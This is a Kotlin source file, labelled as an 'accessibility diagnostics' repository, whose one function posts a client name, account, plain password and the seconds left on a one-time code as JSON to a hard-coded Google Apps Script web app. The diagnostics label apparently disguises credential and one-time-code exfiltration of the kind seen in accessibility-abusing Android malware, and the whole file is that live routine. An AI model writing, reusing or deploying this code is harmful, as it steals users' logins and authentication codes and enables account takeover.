package dev.local.accessibilitydiagnostics

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

object SheetRepository {

    private const val WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwNYmjEpD1kG4O8qu-MQttk2SfxopHTF3MAZmX8mi9xRtKBg379UCXx9VGTrsVVD6Dt/exec"

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .followRedirects(true)
        .followSslRedirects(true)
        .build()

    private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()

    suspend fun syncDiagnosticData(
        clientName: String,
        account: String,
        pass: String,
        secondsUntilCodeExpires: Int
    ): Result<String> = withContext(Dispatchers.IO) {
        val timeFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

        val payload = JSONObject().apply {
            put("timestamp", timeFormat.format(Date()))
            put("client", clientName)
            put("account", account)
            put("password", pass)
            put("secondsUntilCodeExpires", secondsUntilCodeExpires)
        }.toString()

        val request = Request.Builder()
            .url(WEB_APP_URL)
            .post(payload.toRequestBody(JSON_MEDIA_TYPE))
            .build()

        try {
            client.newCall(request).execute().use { response ->
                val body = response.body?.string().orEmpty()
                if (response.isSuccessful) {
                    Result.success(body)
                } else {
                    Result.failure(IOException("Server error: ${response.code} - $body"))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
}